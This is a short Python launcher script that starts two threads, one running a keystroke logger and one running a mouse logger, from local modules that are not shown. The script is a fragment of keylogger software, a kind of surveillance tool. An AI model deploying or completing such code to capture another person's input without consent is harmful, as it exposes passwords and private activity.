import threading
import Modules.KeyStroke as KeyStroke
import Modules.MouseRecorder as MouseRecorder

if __name__ == '__main__':
    try:
        threading.Thread(target=KeyStroke.KeyLogger).start()
        threading.Thread(target=MouseRecorder.MouseLogger).start()
    except KeyboardInterrupt as e:
        pass